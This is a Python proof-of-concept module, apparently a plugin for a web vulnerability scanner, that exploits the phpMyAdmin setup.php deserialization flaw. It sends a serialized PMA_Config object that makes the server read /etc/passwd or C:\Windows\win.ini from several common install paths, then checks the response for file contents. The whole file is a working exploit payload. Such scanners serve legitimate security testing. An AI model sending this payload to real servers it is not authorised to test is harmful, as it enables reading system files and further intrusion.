#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'phpmyadmin setup deserialization'
        self.keyword = ['phpmyadmin', 'php']
        self.info = 'phpmyadmin setup deserialization'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.CRITICAL
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, [
                    './phpMyAdmin/',
                    './pma/',
                    '/phpmyadmin/',
                    './',
                ]):
                    url = path + 'scripts/setup.php'
                    datas = ['action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}',
                             'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:18:"C:\\Windows\\win.ini";}']
                    for data in datas:
                        async with session.post(url=url, headers=headers, data=data, allow_redirects=False) as res:
                            if res:
                                text = await res.text()
                                if 'root:' in text or '[extensions]' in text:
                                    self.flag = 1
                                    self.res.append({"info": url,"key": "phpmyadmin_setup_deserialization"})
                                    return
